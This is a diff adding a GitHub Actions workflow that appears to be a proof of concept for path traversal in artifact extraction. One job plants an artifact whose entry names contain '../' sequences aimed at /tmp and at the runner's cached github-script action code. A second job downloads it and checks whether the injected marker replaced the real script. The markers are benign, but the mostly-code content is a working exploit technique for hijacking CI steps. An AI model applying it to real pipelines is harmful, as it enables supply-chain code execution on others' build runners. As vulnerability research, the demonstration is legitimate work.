@@ -1,0 +1,38 @@
+name: gab-trav4
+on: workflow_dispatch
+
+jobs:
+  plant:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+      - uses: ./.github/actions/gabzip
+        env:
+          ART_NAME: pr-comment-body.txt
+          ENTRIES_JSON: |
+            [
+              {"name":"pr-comment-body.txt","content":"benign body\n"},
+              {"name":"x/../../../../../../tmp/gab-escape4.txt","content":"ESCAPED_V4_OK\n"},
+              {"name":"x/../../../_actions/actions/github-script/v7/dist/index.js","content":"console.log('HIJACKED_GITHUB_SCRIPT_STEP');\n"}
+            ]
+
+  consume:
+    needs: plant
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: pr-comment-body.txt
+          run-id: ${{ github.run_id }}
+      - name: check escape
+        run: |
+          echo "--- tmp marker:"; cat /tmp/gab-escape4.txt 2>&1 || echo "no /tmp marker"
+          echo "--- action dist:"; head -c 120 /home/runner/work/_actions/actions/github-script/v7/dist/index.js 2>&1 || echo "no dist"
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            console.log('REAL_GITHUB_SCRIPT_RAN');
